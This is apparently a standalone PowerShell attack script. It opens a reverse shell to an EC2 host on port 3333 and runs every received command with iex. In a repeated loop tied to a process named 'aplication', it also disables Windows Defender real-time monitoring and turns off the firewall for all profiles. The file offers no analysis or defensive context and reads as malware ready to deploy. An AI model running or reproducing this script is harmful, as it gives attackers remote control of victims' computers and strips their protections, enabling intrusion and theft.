$sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

$p = "aplication"

Do

{

 "$p found at $(get-date)"

 $proc = Get-Process

 start-sleep 10

 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10

 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10
 
 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10 
 
 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10 
 
 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10 
 
 Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10
} While ($proc.name -contains 'aplication') 